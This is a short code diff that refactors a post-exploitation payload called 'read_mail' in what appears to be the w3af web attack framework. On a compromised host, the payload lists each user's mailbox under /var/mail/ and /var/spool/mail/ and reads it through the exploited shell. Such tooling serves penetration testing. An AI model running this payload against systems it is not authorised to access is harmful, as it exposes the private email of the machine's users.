@@ -1,4 +1,3 @@
-import re
 from plugins.attack.payloads.base_payload import base_payload
 from core.ui.consoleUi.tables import table
 
@@ -7,19 +6,23 @@ class read_mail(base_payload):
     '''
     This payload shows local emails stored on /var/mail/
     '''
-    def api_read(self, parameters):
-        result = {}
+    def fname_generator(self):
         directory_list = []
-
         directory_list.append('/var/mail/')
         directory_list.append('/var/spool/mail/')
 
         users = self.exec_payload('users')
         for directory in directory_list:
             for user in users:
-                content = self.shell.read( directory+user )
-                if content:
-                    result[ directory+user ] = content
+                yield directory+user
+                
+    def api_read(self, parameters):
+        result = {}
+        
+        file_path_iter = self.fname_generator()
+        for file_path, content in self.read_multi(file_path_iter):
+            if content:
+                result[ file_path ] = 'Yes'
 
         return result
         
